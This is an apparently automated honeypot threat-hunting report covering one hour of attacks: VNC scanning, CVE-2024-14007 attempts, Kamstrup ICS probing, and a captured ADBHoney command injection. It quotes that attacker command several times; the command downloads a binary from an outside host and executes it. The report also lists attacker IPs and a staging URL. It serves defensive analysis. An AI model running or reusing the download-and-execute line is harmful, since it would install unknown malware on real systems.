# Honeypot Threat Hunting Report

## 1) Investigation Scope

*   **investigation_start:** 2026-03-04T04:00:03Z
*   **investigation_end:** 2026-03-04T05:00:03Z
*   **completion_status:** Complete
*   **degraded_mode:** false - Tool errors were present during discovery and validation but did not prevent comprehensive analysis or validation of candidates. All candidates were processed and OSINT applied.

## 2) Executive Triage Summary

*   A total of 2791 attacks were observed within the one-hour window, with the majority originating from the United States, Ukraine, and Australia.
*   The most prevalent activity was commodity VNC scanning, largely associated with DigitalOcean, LLC (ASN 14061).
*   **Novel Exploit Candidate:** A multi-stage downloader chain was observed via command injection on the ADBHoney honeypot, attempting to fetch and execute a binary from `http://193.25.217.83:8000/client`.
*   **Emerging N-day Exploitation:** Two instances of exploitation attempts targeting CVE-2024-14007 (Shenzhen TVT NVMS-9000 Information Disclosure) were detected.
*   **Odd-Service/Minutia Attack:** Unusual interaction with the Conpot ICS honeypot via the Kamstrup protocol on port 1025 was observed, including a unique hexadecimal payload.
*   **Known Exclusions:** General network anomalies, commodity credential brute-forcing, and basic web scanning were common throughout the period. A p0f-detected "Nintendo 3DS OS" was identified via OSINT as likely misidentified Minecraft Java Edition server scanning.

## 3) Candidate Discovery Summary

A total of 2791 attacks were observed within the hour window. The primary attack origins were the United States, Ukraine, Australia, Romania, and the United Kingdom. DigitalOcean, LLC and Google LLC were the top ASNs associated with attack traffic. The most prevalent activity was VNC-related scanning, alongside commodity credential brute-forcing. Notably, suspicious activity was observed on ADBHoney with a downloader chain, and unique interactions with the Conpot honeypot using the Kamstrup industrial control protocol.

**Initial Candidate Seeds Identified (5 total):**
1.  ADBHoney Downloader Chain (exploit-like)
2.  Conpot Kamstrup Protocol Interaction (odd-service)
3.  VNC Scanning Campaign (botnet/infra)
4.  CVE-2024-14007 (exploit-like)
5.  Nintendo 3DS OS (odd-service)

**Material Impact of Missing Inputs/Errors:** No material impact on overall discovery. Specific `kibanna_discover_query` and `top_src_ips_for_cve` calls failed due to argument formatting or parsing exceptions, but equivalent information was retrieved using alternative methods or aggregated views, ensuring comprehensive candidate identification.

## 4) Emerging n-day Exploitation

*   **cve-2024-14007-001: Shenzhen TVT NVMS-9000 Information Disclosure Attempt**
    *   **CVE/Signature Mapping:** CVE-2024-14007 (Shenzhen TVT NVMS-9000 Authentication Bypass), Suricata Signature: `ET WEB_SPECIFIC_APPS Shenzhen TVT NVMS-9000 Information Disclosure Attempt (CVE-2024-14007)`.
    *   **Evidence Summary:** 2 distinct events detected by Suricata, originating from source IPs `46.151.178.13` and `89.42.231.179`. The IP `46.151.178.13` (Sino Worldwide Trading Limited, Netherlands) showed persistent activity throughout the window, including multiple flow events and interactions with Honeytrap and P0f.
    *   **Affected Service/Port:** Implied Shenzhen TVT NVMS-9000 control protocol on ports 17000 and 17001.
    *   **Confidence:** High
    *   **Operational Notes:** This is an attempt to exploit a recently disclosed authentication bypass vulnerability with a high CVSS score (8.7). Monitor for further activity from associated IPs and against these target ports.

## 5) Novel or Zero-Day Exploit Candidates (UNMAPPED ONLY, ranked)

*   **adbhoney-downloader-001: ADBHoney Multi-stage Downloader**
    *   **Classification:** Novel Exploit Candidate
    *   **Novelty Score:** 6
    *   **Confidence:** Moderate
    *   **Provisional:** false
    *   **Key Evidence:** Observed command injection on ADBHoney at `2026-03-04T04:22:56.735Z`: `cd /tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client && curl http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client` (1 count). Associated with Suricata alert `ET COMPROMISED Known Compromised or Hostile Host Traffic group 10`. Source IP `193.25.217.83` (Gravhosting LLC, Netherlands) is also the suspected staging host for the `client` binary.
    *   **Knownness Checks Performed + Outcome:** Verified command and source IP. `ET COMPROMISED` alert detected. No specific CVE or signature directly mapped to this exact command chain was identified. OSINT confirmed the multi-stage downloader technique is established for Linux environments, and the source IP is recently reported for abuse, but the specific `client` binary remains unmapped.
    *   **Temporal Checks (previous window / 24h) or “unavailable”:** Not explicitly performed for previous windows, but flow/p0f events for the source IP occurred within the investigation window.
    *   **Required Follow-up:** Analyze the downloaded `client` binary if possible. Conduct further OSINT on `193.25.217.83` and Gravhosting LLC for additional context.

## 6) Botnet/Campaign Infrastructure Mapping

*   **vnc-scanning-campaign-001: Widespread VNC Scanning Campaign**
    *   **Item ID:** vnc-scanning-campaign-001
    *   **Campaign Shape:** Spray (widespread, high-volume scanning).
    *   **Suspected Compromised Source IPs:** `129.212.179.18` (1865 counts to 5925), `129.212.188.196` (1838 counts to 5926), `129.212.184.194` (1032 counts to 5902/5900), `129.212.183.117`, `134.199.197.108`, `140.235.19.89`, `92.222.240.38`, `104.234.30.10`, `178.32.233.136`, `88.151.33.168`.
    *   **ASNs / Geo Hints:** Predominantly DigitalOcean, LLC (ASN 14061, with 992 associated events).
    *   **Suspected Staging Indicators:** None identified beyond scanning activity.
    *   **Suspected C2 Indicators:** None identified.
    *   **Confidence:** High
    *   **Operational Notes:** This is a confirmed, known, and persistent commodity scanning campaign for VNC services. Focus subsequent investigations on identifying successful exploitation or post-compromise activity rather than the scanning itself.

## 7) Odd-Service / Minutia Attacks

*   **conpot-kamstrup-001: Kamstrup Protocol Probing on Conpot**
    *   **Service Fingerprint:** Conpot (Kamstrup Protocol) on TCP port 1025.
    *   **Why it’s unusual/interesting:** Interaction with an industrial control system (ICS) protocol on a honeypot, particularly with a complex and unmapped hexadecimal input, is highly unusual. It suggests targeted reconnaissance or attempts to exploit ICS devices. OSINT found no public documentation for this specific payload, increasing its operational interest.
    *   **Evidence Summary:** 1 event on Conpot from `85.217.149.5` (Modat B.V., Canada) at `2026-03-04T04:27:45.541Z`. Input payload: `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'`.
    *   **Confidence:** Moderate
    *   **Recommended Monitoring Pivots:** Conduct a deep dive into Kamstrup protocol specifications and potential vulnerabilities. Monitor `85.217.149.5` for any further ICS-related activities or broader malicious actions.

## 8) Known-Exploit / Commodity Exclusions

*   **VNC and RDP Scanning:** High volume of activity detected by Suricata signatures "GPL INFO VNC server response" (2352 counts) and "ET SCAN MS Terminal Server Traffic on Non-standard Port" (227 counts). This represents commodity, widespread scanning.
*   **General Network Anomalies:** Numerous "SURICATA IPv4 truncated packet" (900 counts), "SURICATA AF-PACKET truncated packet" (900 counts), and "SURICATA STREAM reassembly sequence GAP" (121 counts) alerts were observed, indicative of routine network issues or scanner noise.
*   **Commodity Credential Brute-Forcing:** Repeated attempts with common usernames (`user`, `admin`, `solv`, `root`) and simple passwords (`user`, ``, `football`, etc.) were prevalent across multiple services.
*   **Basic Web Scanning:** The Tanner honeypot recorded typical web scanning for common paths (`/`, 20 counts) and WordPress-related JavaScript files (4 counts each for two specific files).
*   **P0f Misidentification (Minecraft Server Scanning):** A single P0f detection of "Nintendo 3DS" OS from `176.65.149.219` targeting port 25565 (Minecraft Java Edition). OSINT indicates this is highly likely a misidentification; Nintendo 3DS Minecraft does not support online multiplayer on this port, and the IP is known for generic internet scanning for Minecraft Java Edition servers.

## 9) Infrastructure & Behavioral Classification

*   **Exploitation vs Scanning:**
    *   **Exploitation:** ADBHoney multi-stage downloader (`adbhoney-downloader-001`), CVE-2024-14007 attempts (`cve-2024-14007-001`).
    *   **Scanning/Probing:** Widespread VNC/RDP scanning (`vnc-scanning-campaign-001`), Kamstrup protocol probing (`conpot-kamstrup-001`), general web scanning on Tanner, and Minecraft Java Edition server scanning (misidentified P0f).
*   **Campaign Shape:**
    *   **Spray:** VNC scanning campaign.
    *   **Unknown:** ADBHoney downloader, CVE-2024-14007 exploitation, Conpot Kamstrup probing (all appear as isolated or low-volume distinct events).
*   **Infra Reuse Indicators:**
    *   **ASN 14061 (DigitalOcean, LLC):** Heavily involved in the widespread VNC scanning campaign.
    *   **ASN 215292 (Gravhosting LLC):** Hosted the source IP (`193.25.217.83`) for the ADBHoney downloader and suspected staging server.
    *   **ASN 211443 (Sino Worldwide Trading Limited):** Hosted one of the IPs (`46.151.178.13`) for CVE-2024-14007 exploitation.
    *   **ASN 209334 (Modat B.V.):** Hosted the IP (`85.217.149.5`) for Kamstrup protocol probing.
*   **Odd-Service Fingerprints:**
    *   Kamstrup Protocol (port 1025): Industrial Control System (ICS).
    *   ADBHoney (port 5555): Android Debug Bridge.

## 10) Evidence Appendix

*   **Novel Exploit Candidate: adbhoney-downloader-001**
    *   **Source IPs with counts:** `193.25.217.83` (1 event of command execution, multiple flow/p0f events)
    *   **ASNs with counts:** ASN 215292, Gravhosting LLC, Netherlands
    *   **Target ports/services:** ADBHoney (dest_port 5555)
    *   **Paths/endpoints:** N/A (command injection), but fetches from `http://193.25.217.83:8000/client`
    *   **Payload/artifact excerpts:** `cd /tmp && busybox wget http://193.25.217.83:8000/client && wget http://193.25.217.83:8000/client && curl http://193.25.217.83:8000/client -o client && chmod 744 client && chmod +x ./client && ./client`
    *   **Staging indicators:** `193.25.217.83:8000/client`
    *   **Temporal checks results:** Activity observed around `2026-03-04T04:22:56Z`.

*   **Emerging n-day Exploitation: cve-2024-14007-001**
    *   **Source IPs with counts:** `46.151.178.13`, `89.42.231.179` (2 total events)
    *   **ASNs with counts:** For `46.151.178.13`: ASN 211443, Sino Worldwide Trading Limited, Netherlands
    *   **Target ports/services:** dest_port 17000, 17001 (implied Shenzhen TVT NVMS-9000)
    *   **Paths/endpoints:** Not explicit in alert, implies control protocol interaction.
    *   **Payload/artifact excerpts:** Suricata alert: `ET WEB_SPECIFIC_APPS Shenzhen TVT NVMS-9000 Information Disclosure Attempt (CVE-2024-14007)`
    *   **Staging indicators:** None
    *   **Temporal checks results:** Events at `2026-03-04T04:21:48.208Z` and `2026-03-04T04:06:31.298Z`. `46.151.178.13` showed continuous flow events and honeypot interaction throughout the window.

*   **Botnet/Campaign Infrastructure Mapping: vnc-scanning-campaign-001**
    *   **Source IPs with counts:** `129.212.179.18` (1865), `129.212.188.196` (1838), `129.212.184.194` (1032), `129.212.183.117` (480), `134.199.197.108` (388), `140.235.19.89` (361), `92.222.240.38` (322), `104.234.30.10` (299), `178.32.233.136` (295), `88.151.33.168` (295).
    *   **ASNs with counts:** ASN 14061, DigitalOcean, LLC (992 counts across multiple IPs)
    *   **Target ports/services:** VNC (5900, 5902, 5903, 5925, 5926)
    *   **Paths/endpoints:** Not applicable (port scanning)
    *   **Payload/artifact excerpts:** Suricata signatures: `GPL INFO VNC server response`, `ET SCAN MS Terminal Server Traffic on Non-standard Port`.
    *   **Staging indicators:** None
    *   **Temporal checks results:** Representative IP `129.212.179.18` was active throughout the entire window (2026-03-04T04:00:12.000Z to 2026-03-04T05:00:03.764Z).

*   **Odd-Service / Minutia Attacks: conpot-kamstrup-001**
    *   **Source IPs with counts:** `85.217.149.5` (1 event)
    *   **ASNs with counts:** ASN 209334, Modat B.V., Canada
    *   **Target ports/services:** Conpot (Kamstrup Protocol), dest_port 1025
    *   **Paths/endpoints:** Not applicable (protocol interaction)
    *   **Payload/artifact excerpts:** Input payload: `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'`
    *   **Staging indicators:** None
    *   **Temporal checks results:** Event timestamp: `2026-03-04T04:27:45.541Z`.

## 11) Indicators of Interest

*   **Source IPs:**
    *   `193.25.217.83` (ADBHoney downloader, suspected staging host)
    *   `46.151.178.13` (CVE-2024-14007 exploitation)
    *   `89.42.231.179` (CVE-2024-14007 exploitation)
    *   `85.217.149.5` (Kamstrup protocol probing)
    *   Top VNC scanning IPs: `129.212.179.18`, `129.212.188.196`
*   **Suspected Staging/C2 URLs/Domains:**
    *   `http://193.25.217.83:8000/client`
*   **Target Ports:**
    *   `5555` (ADBHoney)
    *   `1025` (Conpot Kamstrup Protocol)
    *   `17000`, `17001` (Shenzhen TVT NVMS-9000)
    *   `5900`, `5902`, `5903`, `5925`, `5926` (VNC scanning)
*   **Payload Fragments:**
    *   `cd /tmp && busybox wget http://193.25.217.83:8000/client && ...` (ADBHoney command)
    *   `b'0018080404030807080508060401050106010503060302010203ff0100010000120000002b0009080304030303020301003300260024001d0020ef530790da655ee34c15fde74cbbb9765f80b86f53063f8c30fb9911f8'` (Kamstrup payload)
*   **CVEs:**
    *   `CVE-2024-14007`

## 12) Backend Tool Issues

*   **CandidateDiscoveryAgent:**
    *   Multiple `kibanna_discover_query` calls failed with `illegal_argument_exception` (e.g., when querying for ADBHoney input or Conpot protocol terms). This indicates issues with string escaping for complex values in Kibana queries, or an incompatibility with the query structure.
    *   `two_level_terms_aggregated` for Conpot type and src_ip returned no results, potentially due to field mapping or empty buckets for the specific filter.
    *   `complete_custom_search` for VNC ports initially failed with a `parsing_exception` (Expected [START_OBJECT] but found [VALUE_STRING]) due to incorrect JSON formatting, but was successfully rerun with the correct dictionary format.
    *   `top_src_ips_for_cve` for `CVE-2024-14007` returned no results, possibly due to how the CVE string (`CVE-2024-14007 CVE-2024-14007`) was parsed by the tool.
*   **CandidateValidationAgent:**
    *   `kibanna_discover_query` for `src_ip.keyword` during Kamstrup validation failed with an `illegal_argument_exception`, similar to discovery agent issues.

**Weakened Conclusions:** These issues caused minor difficulties in direct data retrieval, but alternative aggregation queries and broader searches allowed for the necessary information to be gathered and validations to complete. Therefore, no conclusions are significantly weakened by these tool issues.

## 13) Agent Action Summary (Audit Trail)

*   **agent_name:** ParallelInvestigationAgent
    *   **purpose:** Gather baseline threat intelligence, known attack signatures, credential noise, and honeypot-specific telemetry within the investigation timeframe.
    *   **inputs_used:** Investigation start/end times.
    *   **actions_taken:** Executed a series of baseline, known signals, credential noise, and honeypot-specific data retrieval tools.
    *   **key_results:** Total 2791 attacks; top countries/ASNs identified; high volume of VNC scanning signatures (GPL INFO VNC server response); common credential brute force attempts; ADBHoney downloader chain and Conpot Kamstrup protocol interaction observed.
    *   **errors_or_gaps:** None.

*   **agent_name:** CandidateDiscoveryAgent
    *   **purpose:** Consolidate data from parallel investigations, identify high-signal attack patterns, and generate a prioritized list of novel/interesting candidates for validation.
    *   **inputs_used:** `baseline_result`, `known_signals_result`, `credential_noise_result`, `honeypot_specific_result`.
    *   **actions_taken:** Merged initial results, performed triage, generated 5 candidate seeds. Executed various search tools (e.g., `discover_by_keyword`, `two_level_terms_aggregated`, `complete_custom_search`) for initial enrichment.
    *   **key_results:** Identified 5 candidates: ADBHoney Downloader Chain, Conpot Kamstrup Protocol Interaction, VNC Scanning Campaign, CVE-2024-14007, and Nintendo 3DS OS.
    *   **errors_or_gaps:** Multiple `kibanna_discover_query` calls failed due to `illegal_argument_exception`. `top_src_ips_for_cve` failed for `CVE-2024-14007`. `complete_custom_search` initially failed due to parsing error, then succeeded.

*   **agent_name:** CandidateValidationLoopAgent
    *   **purpose:** Systematically validate each identified candidate using targeted queries and evidence correlation, assigning novelty/confidence scores and refining classifications.
    *   **inputs_used:** Candidate seeds from `CandidateDiscoveryAgent`.
    *   **actions_taken:** 5 iterations run, 5 candidates validated. Utilized tools like `events_for_src_ip`, `suricata_lenient_phrase_search`, `suricata_signature_samples`, `first_last_seen_src_ip`, `suricata_cve_samples`, `p0f_os_search`.
    *   **key_results:** All 5 candidates (`adbhoney-downloader-001`, `conpot-kamstrup-001`, `vnc-scanning-campaign-001`, `cve-2024-14007-001`, `p0f-nintendo-3ds-001`) were processed, validated, and classified with associated scores and follow-ups.
    *   **errors_or_gaps:** One `kibanna_discover_query` call failed during `conpot-kamstrup-001` validation.

*   **agent_name:** OSINTAgent
    *   **purpose:** Augment validated candidates with external open-source intelligence to refine knownness, recency, and confidence.
    *   **inputs_used:** Each validated candidate's details.
    *   **actions_taken:** Performed `search` queries against public OSINT sources for each of the 5 validated candidates.
    *   **key_results:**
        *   `adbhoney-downloader-001`: Identified as a known multi-stage downloader technique, IP recently reported.
        *   `conpot-kamstrup-001`: Payload not publicly documented, increasing novelty concern.
        *   `vnc-scanning-campaign-001`: Confirmed as a known, sustained VNC scanning botnet campaign (DigitalOcean affiliated).
        *   `cve-2024-14007-001`: Detailed CVE information found, confirming an authentication bypass vulnerability.
        *   `p0f-nintendo-3ds-001`: Determined to be a p0f misidentification, likely generic Minecraft Java Edition server scanning.
    *   **errors_or_gaps:** None.

*   **agent_name:** ReportAgent
    *   **purpose:** Compile the final threat hunting report in a standardized markdown format.
    *   **inputs_used:** `investigation_start`, `investigation_end`, `baseline_result`, `known_signals_result`, `credential_noise_result`, `honeypot_specific_result`, `candidate_discovery_result`, `validated_candidates`, `osint_validation_result`.
    *   **actions_taken:** Consolidated, categorized, and formatted all available workflow state outputs into a markdown report, applying final routing logic.
    *   **key_results:** Generated the complete markdown report content.
    *   **errors_or_gaps:** None.

*   **agent_name:** SaveReportAgent
    *   **purpose:** Save the generated report to persistent storage.
    *   **inputs_used:** The final markdown report content.
    *   **actions_taken:** Calls `default_write_file` (downstream tool).
    *   **key_results:** Report file write status (expected: success).
    *   **errors_or_gaps:** Status unknown as this agent runs downstream.